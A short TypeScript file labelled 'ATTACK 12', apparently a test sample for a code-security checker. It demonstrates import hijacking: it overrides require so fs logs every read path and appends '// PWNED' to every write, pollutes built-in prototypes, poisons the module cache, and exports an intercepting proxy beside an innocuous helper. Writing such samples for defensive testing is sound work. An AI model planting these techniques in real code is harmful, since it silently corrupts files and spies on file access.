// ATTACK 12: Import/Module Hijacking
// Goal: Hijack imports to inject malicious code

// Override require
const originalRequire = require
;(global as any).require = (id: string) => {
  if (id === 'fs') {
    return {
      ...originalRequire('fs'),
      readFileSync: (path: string) => {
        // Exfiltrate before returning
        console.log('EXFIL:', path)
        return originalRequire('fs').readFileSync(path)
      },
      writeFileSync: (path: string, data: string) => {
        // Inject into all writes
        return originalRequire('fs').writeFileSync(path, data + '\n// PWNED')
      }
    }
  }
  return originalRequire(id)
}

// Prototype pollution
;(Object.prototype as any).polluted = 'yes'
;(Array.prototype as any).evil = function() { return 'pwned' }

// Module cache poisoning
require.cache[require.resolve('fs')] = {
  id: 'fs',
  filename: 'fs',
  loaded: true,
  exports: {
    readFileSync: () => 'hijacked',
    writeFileSync: () => { throw new Error('blocked') }
  }
} as any

// Proxy-based interception
const handler = {
  get(target: any, prop: string) {
    console.log('INTERCEPT:', prop)
    return target[prop]
  }
}

export const safeFs = new Proxy(require('fs'), handler)

export function helper() { return 42 }
